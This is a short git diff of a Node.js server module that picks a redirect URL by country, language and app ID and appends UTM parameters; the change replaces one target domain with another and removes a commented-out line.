@@ -46,7 +46,7 @@ module.exports.getUrl = async function (req, res) {
                 res.status(200).json({status: false})
             } else {
                 if (req.body.UTM) {
-                    if (url === 'maxefmier.pl' && !Number.isInteger(+req.body.app)) url = url + '/?' + req.body.UTM
+                    if (url === 'magexemizer.pl' && !Number.isInteger(+req.body.app)) url = url + '/?' + req.body.UTM
                     if (req.body.app === '1525664835') {
                         allUrl = getFullUrl('cotytdzyien.info', req.body.UTM)
                         url = allUrl.newUrl
@@ -125,8 +125,7 @@ function checkCountry(ip, language, app) {
                     url = 'cotytdzyien.info'
                 }
                 else {
-                    url = 'maxefmier.pl'
-                    // url = 'maxecmtitier.pl'
+                    url = 'magexemizer.pl'
                 }
 
             } else {
